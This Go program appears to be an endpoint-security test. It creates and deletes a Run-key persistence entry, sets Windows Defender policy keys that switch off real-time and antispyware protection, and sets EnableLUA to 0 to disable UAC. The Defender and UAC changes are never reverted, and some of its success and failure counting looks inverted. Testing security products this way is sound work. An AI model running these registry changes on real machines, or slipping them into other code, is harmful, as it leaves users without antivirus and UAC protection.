package main

import (
	"helpers"
	"os"
	"path/filepath"

	"golang.org/x/sys/windows/registry"
)

func createStartKey(nameOfLogFile string) int {
	keyStart, b, err := registry.CreateKey(registry.CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", registry.ALL_ACCESS)
	if !b {
		if err != nil {
			return 1
		}
	}

	ex, err := os.Executable()
	getFullPath, _ := filepath.Abs(ex[:len(ex)-11])

	err = keyStart.SetStringValue("Show Box", getFullPath+"\\showMessage\\showMess.exe")
	if err != nil {
		helpers.WriteLog(nameOfLogFile, err.Error(), 1)
	}

	err = keyStart.DeleteValue("Show Box")
	if err != nil {
		helpers.WriteLog(nameOfLogFile, err.Error(), 1)
	}
	return 0
}

func disableWindowsDefender(nameOfLogFile string) int {
	keyAV, err := registry.OpenKey(registry.LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", registry.WRITE)
	if err != nil {
		return 1
	}

	disableAntiSpywareName := "DisableAntiSpyware"
	disableAntiSpywareValue := uint32(1)
	disableAntiVirusName := "DisableAntiVirus"
	disableAntiVirusValue := uint32(1)
	disableRealtimeMonitoringName := "DisableRealtimeMonitoring"
	disableRealtimeMonitoringValue := uint32(1)
	disableRoutinelyTakingActionName := "DisableRoutinelyTakingAction"
	disableRoutinelyTakingActionValue := uint32(1)
	disableSpecialRunningModesName := "DisableSpecialRunningModes"
	disableSpecialRunningModesValue := uint32(1)
	serviceKeepAliveName := "ServiceKeepAlive"
	serviceKeepAliveValue := uint32(0)

	err = keyAV.SetDWordValue(disableAntiSpywareName, disableAntiSpywareValue)
	if err != nil {
		helpers.WriteLog(nameOfLogFile, err.Error(), 1)
	} else {
		return 1
	}
	err = keyAV.SetDWordValue(disableAntiVirusName, disableAntiVirusValue)
	if err != nil {
		helpers.WriteLog(nameOfLogFile, err.Error(), 1)
	} else {
		return 1
	}
	err = keyAV.SetDWordValue(disableRealtimeMonitoringName, disableRealtimeMonitoringValue)
	if err != nil {
		helpers.WriteLog(nameOfLogFile, err.Error(), 1)
	} else {
		return 1
	}
	err = keyAV.SetDWordValue(disableRoutinelyTakingActionName, disableRoutinelyTakingActionValue)
	if err != nil {
		helpers.WriteLog(nameOfLogFile, err.Error(), 1)
	} else {
		return 1
	}
	err = keyAV.SetDWordValue(disableSpecialRunningModesName, disableSpecialRunningModesValue)
	if err != nil {
		helpers.WriteLog(nameOfLogFile, err.Error(), 1)
	} else {
		return 1
	}
	err = keyAV.SetDWordValue(serviceKeepAliveName, serviceKeepAliveValue)
	if err != nil {
		helpers.WriteLog(nameOfLogFile, err.Error(), 1)
	} else {
		return 1
	}

	return 0
}

func disableUAC(nameOfLogFile string) int {
	keyUAC, b, err := registry.CreateKey(registry.LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", registry.WRITE)
	if !b {
		if err != nil {
			return 1
		}
	}

	err = keyUAC.SetDWordValue("EnableLUA", uint32(0))
	if err != nil {
		helpers.WriteLog(nameOfLogFile, err.Error(), 1)
		return 1
	}

	return 0
}

func main() {
	numberOfStoppedRegistryModifications := 0
	nameOfLogFile := helpers.CreateLogFileIfItDoesNotExist("./", "RegKeys")
	helpers.WriteLog(nameOfLogFile, "Starting test: RegistryKeys", 2)
	numberOfStoppedRegistryModifications += createStartKey(nameOfLogFile)
	numberOfStoppedRegistryModifications += disableWindowsDefender(nameOfLogFile)
	numberOfStoppedRegistryModifications += disableUAC(nameOfLogFile)

	if numberOfStoppedRegistryModifications == 3 {
		os.Exit(1)
	} else {
		helpers.WriteLog(nameOfLogFile, "Ending test: RegistryKeys", 2)
		os.Exit(0)
	}

}
